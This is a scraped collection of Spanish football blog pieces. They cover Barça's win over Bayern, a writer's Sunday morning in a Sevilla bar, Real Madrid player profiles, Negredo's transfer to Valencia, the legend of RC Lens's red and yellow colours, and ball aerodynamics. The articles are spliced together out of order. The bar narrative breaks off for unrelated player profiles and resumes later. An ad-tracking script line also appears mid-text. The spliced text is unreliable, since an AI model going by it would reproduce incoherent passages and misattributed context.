Bayern, tras el cataclismo sufrido en la segunda parte del partido del Camp Nou, pasaba por una consigna muy clara. Los primeros minutos del choque debían llevar el enfrentamiento a un clima incómodo para un FC Barcelona que acudía extremadamente sereno a la cita del Allianz. Jugar el partido a ritmo de heavy metal y no de bossa-nova. Situaciones extremas, como la que afrontaba el equipo de Guardiola en este compromiso de vuelta, exigían de reacciones extremas. Casi tanto, que incluso empezar marcando en los primeros diez minutos podía parecer insuficiente para disparar el pulsómetro barcelonista.Tal vez por eso, empujado por la necesidad de crear una atmósfera difícil de digerir para el Barça, Guardiola tomó la arriesgada decisión de inclinar su equipo hacia delante de una manera vertiginosa. Una presión en clave alta, atosigante y voraz, a la salida del balón azulgrana como premisa fundamental para comenzar a voltear la eliminatoria y recomponer el desaguisado. Pero la manta bávara ni es tan larga ni, por supuesto, tan tupida y cálida como la barcelonista. El planteamiento de Pep dejó a su equipo con los pies al aire. Algo que al principio de una noche calurosa puede resultar hasta agradable pero que cuando entra la madrugada acaba en desazón, incomodidad y muchas posibilidades de coger un resfriado. Porque Boateng y Benatia, dos centrales fuertes y poderosos en el cuerpo a cuerpo pero bastante más limitados en espacios abiertos, dejaron un erial a sus espaldas tratando de no partir el equipo en dos. La manta era demasiado corta y un frío cortante como un cuchillo se colaba entre Neuer y sus defensas.La invitación a la vanguardia culé era irresistible. Porque además ha llegado ese momento en el que uno no sabe si Luis Suárez, Neymar y Messi son más importantes por el juego que generan o por su capacidad para resolver jugadas. La compenetración entre los tres es máxima. Jamás se vio tal grado de complicidad y armonía entre un argentino, un uruguayo y un brasileño. Da igual quién reciba descolgado, quién se desmarque, quién filtre el pase definitivo o quién finalice la jugada, porque cualquiera de los tres espadas puede ejercer de factótum en ese ataque salvaje que maneja Luis Enrique.Descolgué un chándal del perchero. Uno Hummel, negro, algo grandón. Mi único chándal. El chándal de las grandes ocasiones. Con tela brillante de yonki ochentero. Me puse unas zapatillas de correr que han visto menos ciudad que un Yorkshire de terraza. Y me lancé a la calle.Compré El Mundo, que es el que me paga, y me leí mientras buscaba una cafetería donde desayunar. La mañana estaba clara y húmeda. Las calles de Sevilla están huérfanas los domingos tan temprano. Es como si una enorme resaca los hubiera borrado a todos. A lo lejos un señor que corre alopécico y luminoso. Una señora en leggins que pasea aterida a un perrito. Poco más. Coches que circulan a quién sabe dónde a esas horas. Los domingos son habitaciones irrespirables. Un vestíbulo de hotel viejo. Incómodos por su silencio.Como soy nuevo en el barrio, también en la ciudad, me metí por azar en una cafetería pequeña con aspecto de bar de mi niñez. Sillas rojas, cafetera ruidosa, televisión con noticias, el tintineo de una máquina tragaperras vomitándole cuatro duros a un señor que miraba hacia atrás buscando el aplauso de la afición local.En el bar había un ciego, una pareja de unos sesenta años, un borracho mudo por el alcohol sentado solo en una mesa mirando hacia la luz que entraba como un cañonazo por la única ventana del recinto, el de la tragaperras, el camarero. Y yo, de chándal, con El Mundo bajo el brazo.Dije “buenos días” con ceremoniosa vecindad. Ese “buenos días” que de joven musitas y que de grande ya voceas con tono orgulloso como de pertenencia a una manada extraña. “Soy compañero” pareces decir cuando entras a un bar con gente de vueltas de todo. Queriendo ser parte de ese plan divino de llenar los bares de desconocidos que se conocen. De personas con vidas oscuras, con sonrisas amarillas pero tiernas. “El único bueno del Betis es Adán”, dijo el ciego. Y pensé “¡bien!” porque a él dediqué el artículo de previa que publicaba El Mundo. “Hoy al Betis le caen otros cinco” dijo el hombre de la pareja que apuraba una tostada con mollete generoso y aceite como para bañar a Cleopatra. “Igual que al Sevilla”, dijo el camarero, ya anciano, secando los vasos con un trapo como si un director lo hubiera contratado de figurante y le hubiera dicho: haz algo como de camarero.En Sevilla he notado, no sé si consecuencia de la bicefalia futbolística, que se habla mucho de fútbol. Yo, que con la excusa de ser escritor, pongo siempre la oreja en las conversaciones ajenas; asisto a debates continuos acerca de Emery, Mel, Joaquín, Reyes, Llorente o Castro. En Málaga no lo noté tanto. En Córdoba aún menos. En Sevilla es diferente. En Sevilla gustan de señalarse. De dejar claro contra quien se pegan los tiros y en qué trinchera se resguardan.Sevilla es una ciudad sin tibieza. Intuyo que esa pertenencia a los extremos es justo lo que espanta a otros andaluces. Desde dentro se ve con naturalidad y hasta se disfruta. Estoy cómodo entre tertulianos airados y verdades absolutas. Escucho como discuten en el bar pero no intervengo. Me falta arrojo aún para meterme en esos berenjenales. “¿Qué partido dan hoy a las doce?” pregunta el ciego. No es un chiste. Era ciego. Llevaba gafas oscuras y bastón. Cogía el vaso del café a tientas. Me hubiera gustado hablar con él acerca de cómo sentía el fútbol. Si no veía desde niño o fue gradual. Era el que más cordura ponía sobre la mesa. Dijo que lo de Rubén Castro es una racha. Que todos los delanteros buenos tienen rachas. Que Ceballos no servía para el Betis porque entendía el juego como un sevillista. Dijo que el Atlético no tenía equipo para tanto, que ir con miedo al Calderón era una cosa nueva, que allí había ganado hasta el Jaén. “Da igual el partido, no ves que éste –señalando al camarero- ha quitado el Plus”, dijo la mujer de la pareja que se limpiaba el tomate de la barbilla. “El Córdoba juega a las doce”, dije. Y me miraron.Es muy probable que no siga el próximo año, y no jugará hoy.Özil. El nuevo niño bonito del Bernabéu, un mago con ojos de camaleón con un don para realizar acciones casi imposibles, tan estéticas como útiles, que en un segundo devuelven el precio de la entrada. Heredero natural de Guti, flota como un elfo sobre el césped, juega con el despego de los elegidos y mejora la mayoría de los balones que pasan por sus botas. Más constante ahora que a principio de temporada, está a un partido grande del estatus de estrella mundial. Con 22 años, debe leer esta serie de partidos como una gran oportunidad.Di María. La sorpresa esta temporada para una gran parte del público del Bernabéu, que no sigue la Superliga portuguesa y en el Mundial vio pasar desapercibido a un futbolista con aspecto de no dedicarse demasiado a la buena mesa. El Fideo comenzó a cambiar esa percepción desde el primer día, a base de velocidad, sacrificio, una capacidad para el uno contra uno de la que no anda sobrada la plantilla blanca, y buena relación con el gol, especialmente a través de la media distancia. Su única cruz es un físico endeble que no respalda su juego pletórico de intensidad. En cualquier caso, desequilibrante.Kaká. El Balón de Oro de 2007 lleva tiempo defendiendo con uñas y dientes su candidatura a fichaje menos rentable de la historia del fútbol. Siempre protegido por los medios, que no tienen rubor en anunciar su recuperación por un partido medio bueno y dos goles de penalty, la realidad es que en dos años apenas ha podido verse algún destello del torbellino de potencia y clase que asombró en San Siro. Lastrado por un Mundial que no debió disputar y una infinita sucesión de problemas físicos, la calificación de ex-futbolista planea sobre él, y pocos en el club confían en recuperar siquiera una parte de la inversión realizada. La  posibilidad de que pueda quitarle el puesto a Özil resulta grimosa.Cristiano Ronaldo. Como el año pasado, el futbolista más mediático del mundo está firmando cifras de ensueño, y su comienzo de temporada resultó ciertamente arrollador. Sin embargo, resultan preocupantes en un jugador de su caché la incapacidad para desenvolverse en espacios cortos –y por tanto de romper partidos-, sus problemas con el juego asociativo y su diarrea disparadora, que cierra demasiado pronto muchos ataques del Madrid. Da la impresión de que con un poco de mentalización en la dirección adecuada podría dar bastante más de lo que da. En cualquier caso, su rendimiento será una de las claves de estos clásicos.Higuaín. Empezó como un tiro la temporada, pero una hernia lo ha dejado prácticamente inédito. Parece que ha vuelto relativamente en forma, y su regreso es una gran noticia para el Madrid, que necesita de su capacidad para buscarse ocasiones, su estupenda interpretación del contragolpe y, muy especialmente, de su voracidad competitiva, una virtud que no le sobra a ninguno de los dos nueves actuales de la plantilla blanca. Pueden apostar por su titularidad en alguno de estos clásicos.Benzema. Pocas veces la amenaza de perder el puesto ha producido un cambio tan drástico en un futbolista. El delantero tímido y ausente, inofensivo y estático que ejerció de alma en pena durante año y media sufrió una metamorfosis digna de Ovidio para convertirse, casi de un día para otro, en la viva imagen del killer que asombró en Lyon. Desde su resurrección, ha goleado en todo tipo de escenarios, sacado a la superficie la sutileza que siempre le caracterizó, y practicado el preciso juego de paredes y desmarques que le define como jugador de altísimo nivel, mucho más que un simple ariete. El espectro que vagó por el Camp Nou un lejano lunes de Noviembre se ha corporeizado, y si ha recuperado el nivel anterior a la lesión, una afilada punta de lanza apunta a Valdés.Adebayor. El parche invernal cayó de pie sobre el césped de Chamartín, y la suma de dos goles casi inmediatos con el aspecto de príncipe de la sabana y la sonrisa infinita parecían prometer titularidad e idilio con la afición. Sin embargo, pronto se ha visto que el jugador que hay dentro de Manolazo no está a la altura de su aspecto imponente, y que tenemos a un delantero que destaca por su zancada y físico, pero que ni es goleador ni domina suficientemente suertes básicas como el control y el pase. Redimido por sus importantes goles al Tottenham, apunta a titular para mañana, pero su carrera a medio plazo en el Madrid es o debería ser una incógnita. Llega hasta donde llega.Y poco más queda ya que decir. De Canales y Pedro León, que algo les debe de haber pasado con Mourinho, porque no es normal lo que ocurre con ellos. De Garay, que de nada le ha servido su gran año pasado. De Dudek, que debe ser el tipo que más cobra en el mundo por minuto trabajado. Y de los canteranos, Morata, Adán, etc., que siguen esperando su oportunidad. En cualquier caso, es ciertamente improbable que ninguno de estas jugadores pese mínimamente en tormenta que se avecina. Salvo en el caso del amortizado Jerzy, su momento en el Madrid está por llegar. Seguramente es el gol más recordado de la historia del fútbol escocés. Archie Gemmill homenajea los tiempos pretéritos –cuando Escocia era la técnica e Inglaterra poco más que la fuerza bruta- recogiendo un balón en el vértice del área, desarrollando un par de pasos de ballet entre los defensas holandeses, y batiendo al arquero Jongbloed con una delicada versión del pase a la red. Un tanto que hacía posible la clasificación para la segunda fase, y que aunque al final resultase inútil, provocó un delirio que no se ha olvidado ni en Edimburgo, ni en Glasgow, ni en Aberdeen. Véase Trainspotting. Casi todo resultaba rutinario y frío anoche en el Santiago Bernabéu. Una eliminatoria más de Copa de Europa entre las decenas que ha vivido el coliseo blanco, ya decidida salvo catástrofe impensable. Un rival pequeño, asustadizo, con la inferioridad asumida. El comienzo animoso de los locales, la dejadez del segundo tiempo, la matemática e inevitable sucesión de goles que caían como las gotas de lluvia que mojaban en el césped. El recuerdo a Juanito –más sonoro de lo habitual, mandaba el aniversario-, el minuto de silencio, tres suertes perfectas y características de Kaká, Ronaldo y Di María. En palabras del etéreo Damien Rice, nothing unusual, nothing strange, close to nothing at all. Nada raro ni inusual… salvo la mancha naranja. Bastaba levantar la mirada y dirigirla a la más remota curva del Fondo Norte para encontrarlos. Con sus camisetas naranja, sus cánticos continuos, estruendosos, ininteligibles, enternecedores. La alegría con la que se les veía disfrutar del momento, en el campo del gigante de los gigantes, ahítos de orgullo por ver a sus jugadores, al equipo más modesto que jamás olió cuartos en la máxima competición, batiéndose el cobre mano a mano con algunos de los mejores jugadores del mundo. Irguiéndose como un solo hombre, en máxima tensión, mientras Manduca encaraba a Casillas, y celebrando el golazo con la felicidad más pura que pueda procurar el fútbol. Un corriente de simpatía inundó el estadio en honor a esos tipos que en aquel momento estaban ganando su Liga de Campeones, o tal vez incluso algo más precioso: la historia que revivirán y contarán mil veces hasta que les llegue su hora. Es difícil encontrar una alegoría más clara de lo grande que es el fútbol. Da igual que hayamos perdido el partido de ida por 0-3 y que lo más probable es que en el de vuelta nos caiga una goleada.Y sonreí. Hubo un finísimo silencio, roto solo por la melodía metálica de la tragaperras. Agaché la cabeza y seguí con el periódico un poco abucharado. “¿El Córdoba va bien, no?” me dijo el ciego. “Segundo” dije con timidez. “¿Hoy no jugará Llorente, no?” dijo el camarero dirigiéndose a la pareja. Y siguieron su debate. Terminé de leer el periódico y pagué el café y la tostada. Salí de allí con un adiós descascarillado y suave que fue contestado con gruñidos inaudibles. Ni siquiera me desearon suerte. El Córdoba jugaba contra el Valladolid en unas horas, y enfilé para casa.Me sentí aliviado al no ser acogido por los parroquianos. Dice mi amigo Adolfo Carrillo que los bares buenos son en los que te tratan con desprecio, pero sin pasarse. Pese al chándal, el periódico y el afeitado, no fui tomado muy en cuenta. Aún no soy mi padre, pensé. Hay esperanza. Pero después deseé volver y explicarles mi idea del fútbol del Sevilla, los errores del Betis tras la destitución de Mel.El Barça es un equipo que ya no da su medida en el centro del campo. Ahora lo hace, y a una velocidad de vértigo, en los últimos metros. Ahí donde hasta hace unos meses pasaba penurias que solo Messi parecía capaz de solucionar. Se ha convertido, curiosamente, en el paradigma del contragolpe. No hay equipo en el planeta con los puños tan fuertes como el azulgrana. No hay nadie capaz de combinar arriba con tanta soltura, con tanta precisión y con tanta contundencia.El partido fue un 3-2. Pero podía haber sido un 2-2, un 2-3, un 4-3 o un 5-4. En ningún momento dio la sensación el cuadro de Luis Enrique de haber perdido el control absoluto de la eliminatoria. Porque en el reparto de golpes, sabedor de su superioridad abrumadora, se encuentra cómodo como nadie. Y si encima cuenta con un futbolista como Messi, empeñado en recuperar su cetro mundial aupando a su equipo al reinado europeo, no hay planteamiento táctico capaz de quebrar su trayectoria. Se hizo desear el fichaje bomba de Peter Lim. Eran ya cerca de las doce de la noche del pasado lunes, a apenas unos minutos del cierre definitivo del mercado de fichajes, y el tan cacareado nuevo Valencia CF del magnate de Singapur apenas conseguía diferenciarse, en lo que a plantilla se refiere, del tibio equipo de los años precedentes. La escena había sido convenientemente preparada por Nuno Espírito Santo. El técnico había advertido a una afición que ya empezaba a impacientarse que el equipo se reforzaría con ‘una bomba, un jugador fantástico‘. Y finalmente, sobre la bocina, la bomba terminó por detonar.Álvaro Negredo jugará en el Valencia un primer año en calidad de cedido por el Manchester City -cumpliendo así con las restricciones en gastos impuestas al Valencia por la LFP y el Fair Play financiero- y, posteriormente, pasará a hacerlo como jugador en nómina por cuatro años más (lo que ha dado en denominarse erróneamente como una ‘opción de compra obligatoria’ para el club che), todo ello bajo un montante total de veinticinco millones de euros, un precio de estrella por un jugador que lleva unos meses muy alejado del verdadero rendimiento de un futbolista pretendidamente referencial.La contratación del delantero vallecano, que no hay que ocultar que da un paso atrás en lo que a su carrera deportiva se refiere, coloca al nuevo Valencia en la posición de salida que sus socios demandaban tras la llegada del nuevo propietario al club. Negredo es el salto de calidad que Mestalla ansiaba, la llave para poder lanzarse a competir por recuperar el prestigio perdido en los años recientes en los que la plantilla se desangraba verano tras verano ante la mirada resignada y, sorpresa, cada vez menos soliviantada de la afición valencianista. La llegada del internacional español encierra un mensaje de optimismo, de ilusiones renovadas e intenciones reforzadas. De que el Valencia quiere volver a ser, volver a contar y que, Lim mediante, los días de apreturas económicas y ventas masivas ya van quedado atrás. Se bese o no el escudo valencianista de su camiseta (y ya hay que ser memo, disculpen, para montar una trifulca por semejante motivo), Negredo llega a Mestalla herido, con el orgullo maltrecho después de siete meses de tumultuosa relación con Manuel Pellegrini. Y no se me ocurre un mejor escenario para que ‘La Bestia‘ vuelva a ser peligrosa. Venga, párate a pensar un poco. ¿Cuántas disparatadas ideas has tenido en una noche de borrachera y descontrol que, a la postre, han terminado siendo fenomenales ocurrencias a las que jamás habrías llegado en estado de sobriedad? No creo que las puedas contar por decenas. Cuando la bombillita se enciende alimentada por el efecto de los efluvios alcohólicos, generalmente suele deparar resultados no deseados. Lo que en nuestra mente aparecía adornado como una idea sin igual, en la práctica acaba mostrándose como una torpeza y una necedad. O así suele ser para el común de los mortales.Supongo que una noche de borrachera en 1924 no difería demasiado de lo que supone en 2014. Risas, ocurrencias, jolgorio y esas lógicas consecuencias físicas en las que es preferible no reparar. Aquellos años, en el norte de Francia, eran años de celebración. La Gran Guerra acababa de finalizar, Europa comenzaba a recuperarse del desastre y, en la región, la economía repuntaba gracias a la prolífica actividad minera. Eran días felices, de despreocupación y de calma tras la tempestad, en los que la actividad lúdica o deportiva comenzó a cobrar gran importancia entre la sociedad. En tal escenario, el Racing Club de Lens, iba a vivir un singular acontecimiento que iba a cambiar su historia y transformar para siempre su aún joven aspecto. Fundado en 1906, el Racing Club de Lens, vistió durante sus primeros años de existencia los colores verde y negro en sus uniformes. El verde, por el lugar en el que la juventud de la ciudad comenzó a dar las primeras patadas a una vejiga de cerdo, la Place Verte (Plaza Verde). El negro, por el color de las minas de carbón, origen principal de la creciente riqueza de la región. No duraría mucho el diseño. El club adoptó los colores de la bandera de los Estados Unidos (camiseta azul, pantalón blanco y medias rojas) tras reiniciar su actividad al finalizar la Primera Guerra Mundial, pero el homenaje a aquellos que les habían ayudado a liberarse del yugo alemán apenas permanecería durante una década.Como en todos estos asuntos que se esconden tan profundos en la noche de los tiempos, la historia acerca de los hoy tradicionales colores rojo y amarillo del Racing Club de Lens tiene mucho de leyenda y poco de historia. Ocurre, sin embargo, que las leyendas suelen presentársenos tan bonitas, tan repletas de significado, que a veces terminan por devorar a la historia real o confundirse de tal modo con ella que resulta imposible descifrar qué parte es verídica y qué parte es adorno. La que se refiere al origen de los colores del uniforme del club del norte de Francia nos presenta a René Moglia, presidente lensois, encabezando en aquella noche de 1924 a los miembros de la directiva del club en una noche de celebración que acabaría dando mucho de sí. Recorriendo la ciudad en busca de un lugar para alargar la fiesta, Moglia y los suyos se detuvieron ante las ruinas de la imponente iglesia de Saint-Léger que la guerra había dejado tras de sí, uno de los últimos vestigios de la época de la ocupación española en la zona durante los siglos XVI y XVII. Ante los escombros aún calientes de lo que un día había sido uno de los grandes símbolos de la ciudad, Moglia sugirió a sus acompañantes que los colores de la bandera española, en recuerdo a la brillante época de la ocupación, serían desde aquel momento los colores del club de fútbol de la ciudad. Los colores que cada quince días, y esté como esté el equipo, pueblan el animoso graderío del Felix Bollaert. La exitosa idea que surgió en una noche de fiesta.Puedes comprar camisetas del RC Lens en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. No se va a enfrentar a un equipo de clones con futbolistas autómatas y sin alma, sino que enfrente va a tener a la animosa y descarada Colombia de James, Cuadrado y Jackson Martínez. Neymar Jr. lo arriesga todo con Nike y pretende guiar a la selección brasileña hasta la semifinal, a solo un paso más del gran objetivo, de la gran final de Maracaná.El fútbol pertenece a aquellos que se atreven a arriesgarlo todo. A aquellos que no dudan en jugar sin miedo a la derrota, como el talentoso futbolista de Mogi das Cruzes, siempre decidido a arriesgarlo todo con Nike.var r=Math.round(new Date(). getTime()/1000);(new Image()). src = (location.protocol == "https:"? "https:":"http:") + "//stats.admanmedia.com/a/HDi0ywe2skqStk1WtEcwQfBGQbpoAmORhGgMdwMNDc7y5vxKeLm6VUCBIzSUcIuVhE9DTIZIldZreAPvs4r8U951YN8%252F3i8AJKaLLnwTnT7mo6BS3s%252B%252Bpiky0OBNPN9OK%252Fa7%252B08Qac0t1WgFltBKLA%253D%253D" + '?' + r Hay prisa en Can Barça por pasar la última página de la temporada 2013/14. El paso de Gerardo Martino por el club ya es historia, ya se han anunciado las primeras incorporaciones de la plantilla de cara al próximo verano y esta misma mañana será presentado Luis Enrique, llegado con ciertos aires mesiánicos como nuevo entrenador del club. Se trata de olvidar cuanto antes. Por si toda la batería de novedades fuese escasa, ayer mismo fueron presentadas de manera oficial las que serán nuevas equipaciones barcelonistas que Nike ha diseñado para la próxima campaña.Qué aporta Cristóforo que no aporta N´Zonzi. Seguir siendo parte unos minutos de su improvisada tertulia dominical.El Betis y el Sevilla sudaron para conseguir un punto. La tarde fue un ejemplo de pundonor. De planteamientos pequeños con grandes recompensas. De esfuerzo. De músculos duros. Pensé en mis amigos del bar. Los imaginé frente a la tele. En el fútbol, como en la vida, importa más la entrega que el talento. Vivir es un ejercicio agotador. Los domingos por la mañana están llenos de supervivientes que hablan de fútbol. Si el fútbol llega a ser noble en algún momento es tras las derrotas. No hay nada más respetable que caer en el césped. La unión nace cuando los equipos pierden, los éxitos ayudan a separar, estratifican a la afición, crean suspicacias. Los aficionados abatidos se fusionan en uno para superar el dolor, ganar nos independiza pero fracasar nos sociabiliza, nos abre a los demás. Nos abrazamos a los amigos en el bar, nuestras parejas nos miran con ternura, los hijos portan las bufandas con ese orgullo infantil que es una mezcla de nudo en la garganta, lágrimas contenidas y pundonor párvulo. Perder incita al sexo, al paseo, a la reflexión en voz alta, a la creación, a la lírica. Los héroes mueren, los que sobreviven no superan el juicio del tiempo.Las camisetas de los derrotados, ese botín de guerra, ese icono del adiós, ese símbolo de la nobleza futbolística. Testimonio de tela de lo que pudo ser y no fue. Es imposible mirar estas zamarras con desprecio, es imposible tirar ese resumen de la esperanza rota. Al revés, las conservamos aún con más cariño que la camiseta de la victoria. Ganar sólo sirve para que Adidas haga nuevas elásticas conmemorativas. Perder eterniza los diseños. Como esta camiseta del Alavés del 2001, la que fue sustituida por un diseño bostero aquella noche en la que todos fuímos de Jordi Cruyff y sobre todo de Javi Moreno. O la del Bayer Leverkusen que anticipó la desoladora final de Glasgow. O la camiseta que llevábamos cuando ese personaje siniestro llamado Al Gandhour decapitó nuestras ilusiones.Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.La parroquia se queda muda, los vomitorios lo son más que nunca, la náusea del estadio que despide a una afición deprimida que vuelve a sus quehaceres con el peso de la derrota amarrado al tobillo, arrastrando la tristeza en grupo, soportando solidariamente el infantil berrinche de un amigo que para a orinar antes de salir del estadio, que se lava las manos, que se mira en el espejo y se descubre con los ojos enfangados, con la camiseta de su equipo, con la bufanda anudada a la cabeza. Y tolera el reflejo, sonríe, y dice para sí: otra vez será.La camiseta con la que el Valencia casi tocó el cielo europeo frente al Bayern, la del Barça en el 94 frente al Milan, la de Ghana cuando cayó frente a Uruguay en el reciente mundial, el centenarzazo del Depor en casa del Madrid, el Monaco de Morientes, el Middelsbrough humillado por el Sevilla. Hasta los que ganan reverencian el uniforme del rival, lo hacen propio, se lo llevan a su altar y le hacen un hueco junto a la camiseta victoriosa.Hay derrotas hermosas con camisetas feas, victorias con camisetas horribles, la suerte no entiende de marcas deportivas, de franjas, de disfraces de guerra. Celebremos lo que no pudo ser vistiendo lacamiseta de los perdedores. La final del año pasado de reedita en los octavos. Viendo la prontitud del duelo que fue estelar hace ocho meses podemos vislumbrar una magnífica metáfora para entender la situación de dos equipos que hace no mucho paseaban su superioridad por media Europa, y que ahora se tambalean en sus ligas y algo menos en el tour continental. El Bayern de Van Gaal parecía una máquina bien engrasada, con un Schweinsteiger por fin asentado en la élite, con Robben y Ribery haciendo de las suyas y la definitiva irrupción de Müller, plenamente demostrada en el mundial.Lo mismo me da que en el viaje se me vaya el sueldo de medio mes, que Madrid esté a tres mil kilómetros de mi casa, que me esperen doce horas de viaje o que me espere un infierno el jueves tratando de aguantar despierto en la oficina. Son mis colores, es mi gente, es mi equipo, han llegado donde nadie creía que pudiesen hacerlo, y ahora que la realidad se ha impuesto al sueño, no vamos a dejarlos solos, ni a permitir que puedan confundir el viaje más deseado con una visita al matadero. Iremos con ellos, sufriremos la derrota, y les haremos saber que nadie nunca va a olvidarlos. Ni en Nicosia, ni en Chipre, ni en Europa. Cinco mil estuvieron allí. Es bien sabido que el fútbol moderno se distingue del arcaico en el extremo cuidado de los detalles. El césped se corta a una altura predeterminada, se riega o no, se ensayan jugadas de estrategia de saque de banda, se contratan speakers profesionales para animar a la afición, o se opta por un modelo individualizado de bota que permita maximizar el rendimiento del futbolista en cuestión. Cada rincón del juego o sus alrededores es explorado al milímetro, descompuesto al microscopio buscando esa particularidad que nadie ha visto y que pueda permitir arañar algún punto, alguna victoria, algún gol. Una obsesión por lo lateral que tan pronto prestigia a Benito Floro como hace famoso a Rory Delap.Uno de estos rincones es el que ha inspeccionado recientemente Tim Myers, un tipo muy inteligente, medio matemático medio físico, especialista en mecánica de fluidos. Además de tratar de sacarse la millonada que traen aparejada las ecuaciones de Navier-Stokes, al profesor Myers también le interesa el fútbol. Y en este contexto, trata de contestar una pregunta que ha recibido bastante poca atención, pero que puede ser interesante. Dado que el equipo local es el encargado de suministrar el balón para cada partido, ¿sería posible elegirlo de un modo adecuado para que ayudase a ganar?Recordemos que el reglamento sólo impone restricciones a la circunferencia (68-70 cm.) , el peso (410-450 gr.) y la presión del balón (0,6-1,1 atmósferas al nivel del mar). Dice que su forma ha de ser esférica y nombra al cuero como material, aunque no obliga a su utilización. Basándose en estas premisas, se han fabricado todo tipo de balones, desde el diseño de goma de Goodyear a mediados del siglo XIX hasta los que actualmente guardan el secreto de un chip en su interior. Para un anfitrión, las únicas restricciones que admite el hecho de jugar con un balón u otro tienen que ver esencialmente con el tema de sponsors.El profesor Myers investiga las causas que determinan el movimiento de una bola que gira a gran velocidad, y que se ve sometida a dos efectos contrarios debidos al flujo el aire: el referido a las ecuaciones de Bernoulli, que impulsa la trayectoria hacia arriba, y el efecto Magnus,  que la envía hacia abajo. A partir de este punto de partida, obtiene dos conclusiones muy interesantes: en general, la bola responde mejor a los efectos y curva más su trayectoria jugando al nivel del mar que en altitud; y además, un balón con superficie rugosa dibuja más y mejores efectos con el mismo tiro que un balón con superficie suave. Por tanto, si vives en la costa y te enfrentas a un equipo boliviano, utiliza un balón rugoso, que sea más incontrolable. Si es al revés, usa el suave y verás el rostro de decepción de tus rivales cuando no consigan que el balón describa la trayectoria que desearon. El estudio incluso explica con detalle por qué el Jabulani resultó tan odiado por todos en 2010. No sirve como prueba, evidentemente, pero el Bidvest Wits sudafricano asumió las enseñanzas de Myers y no perdió ni un partido más en casa en la temporada. A lo mejor pronto más gente se toma el asunto en serio. Os dejamos aquí un par de anuncios que nos han impresionado en las últimas semanas. En el primero de ellos, contemplamos toda la parafernalia que llega a montar Heineken en su calidad de patrocinador de la Champions League, y por ende lo que supone ésta como fenómeno planetario. La empresa holandesa reunió a once afortunados, a los cuales hizo sentir por un día, de forma sorpresiva, como campeones de Europa. Impresionante el despliegue que se lleva a cabo en la plaza madrileña de conde de Barajas, incluyendo la orquesta sinfónica.El segundo spot maneja conceptos habituales en las campañas de Nike, como la utilización de famosos futbolistas –en este caso aparecen nombres como Rooney, Ribéry, Drogba, Cesc Fàbregas o el clásico Ronaldinho-, una filmación que combina un montaje trepidante con la utilización de todo tipo de angulados y posiciones de cámara, y esos toques de humor entre absurdo y sardónico que ya hemos visto tantas veces y nos siguen haciendo sonreír. En este caso, el despliegue enfatiza especialmente el carácter universal del fútbol en calidad de fenómeno de masas. Impagable la aparición conjunta de Homer Simpson y Cristiano Ronaldo, tan distintos como semejantes en su condición de iconos globales. Hace unos días, los compañeros de Fiebre Maldini lanzaron un estupendo reportaje sobre el triste destino del Glasgow Rangers, condenado a los pozos más profundos del fútbol escocés por irregularidades financieras de sus directivos. Resultaba conmovedor contemplar como Ibrox se llena cada dos semanas -50.000 almas, ahí es nada- para tratar de llevar en volandas al equipo al lugar que por historia, solera y afición le corresponde.Sin embargo empezaron la temporada titubeando, sin encontrar el camino adecuado para repetir hazañas y con una plantilla corta, descompensada y con serios problemas de disconformidad, como el sonado plante del hoy malaguista Demichelis.El Inter, tras el llorado adiós de Mourinho, creyó encontrar en Benítez el entrenador perfecto para reemplazar al portugués. Se le presuponía mano dura, estabilidad, y consistencia en el juego y en la plantilla. Lo cierto es que ya sea por la rebelión silenciosa de los futbolistas o por los pobres resultados al arrancar la Serie A, Benítez, afortunadamente para su línea, no llegó ni a comerse el turrón. Empezaron de cero con Leonardo, un jugador criado a teta por el vecino de enfrente, y la decisión no ha podido ser más acertada. Una buena racha de victorias y el instantáneo rendimiento del mejor fichaje del invierno, el delantero Pazzini.Cierto que los neroazzurri no pasan por su mejor momento, pero la eficacia de un enrrachado Eto´o y el sustento que le viene dando la veterana línea de mediocentros pueden hacer decantarse la balanza frente a unos muniqueses que no terminan de dar con la tecla en su once titular, sobre todo en la defensa, donde Tymoshchuk viene demostrando su versatilidad y está empezando a afianzarse el recién fichado Luiz Gustavo. Veo superiores a los italianos a doble partido, aunque todo depende de esta ida doméstica para ellos. Münich siempre es una plaza hostil aunque, si la progresión sigue ascendente como ahora y van allí con un buen resultado en la maleta, los hombres de Van Gaal pueden despedirse precipitadamente tras el éxito de la pasada edición. ¿A quién veis favoritos en este eliminatoria igualada? “Yo fui de la Sampdoria durante ciento veinte minutos en una noche de mayo del 92”, le contesto a María. Me dice que está viendo un Sampdoria-Hellas Verona en un restaurante italiano en Nyon. “Se me ocurren mejores planes para un domingo”, añado con un guiño. “Hellas significa Grecia, ¿no te parece curioso ahí en un nombre de equipo?” , me dice. “Mucho”. Y buscamos información en wikipedia a la par. “Qué pena aquella final perdida de la Sampdoria”, le digo. “No seas cruel”, me contesta.El Hellas Verona es un equipo querible. No pasa lo mismo con el Chievo. De todos modos ellos se ignoran entre ellos. Los rivales del equipo gialloblu es el Vicenza. Me encanta que el fútbol esté lleno de manías, prejuicios e insultos gratuitos. “No aguanto al Sporting”, me dice mi compañero de trabajo. “¿Por qué?” , le pregunto. “No sé, pero no lo soporto”, contesta. Así me gusta. Si no tenemos explicaciones para el amor, porque íbamos a tenerlas para el odio.El Hellas Verona ganó un Scudetto. Fue en la 84/85. Ya no tiene más títulos. Leo que hubo pasta y que se fichó bien. Es impensable el éxito futbolístico sin una buena morterada de billetes. La Sampdoria lo ganó en la 90/91. Un año después jugaba la final de la Copa de Europa. El gol de Koeman. Esa historia ya nos suena. Hay equipos que acarician la gloria pero no pueden agarrarla. Le pasó al Bayer Leverkusen. También una noche de mayo, la del 2002. Justo diez años después de lo del Dream Team. El gol de Zidane. Esa historia también nos suena. “A la Sampdoria la entrena Walter Zenga”, me dice María. Sabe mi pasión por los porteros, claro. Lo recuerdo con la camiseta gris plata. Italia 90. En ese Mundial coincidió con Gianluca Vialli, que jugó la final contra el Barça y falló ante Zubizarreta lo que pudo haber sido el gol del partido.Tendencia en marketing. Lo peor, barbudo de los cojones, es que tengo que darte la razón y echarlo de menos en el fútbol.Cualquier equipo tiene relatos de grada que viajan tintineando por un hilo invisible. Van de un asiento a otro, del fondo ultra al palco, de los vomitorios a los autobuses, a los trenes, al pie de la cama de un crío con la bufanda todavía caliente de gritos. Un extremo lo tensan las jugadas, el otro las emociones. De generación en generación pasan con un ¿te acuerdas? como gatillo. Son hilos repletos de vida que bien cosidos acaban por formar la identidad de un equipo. 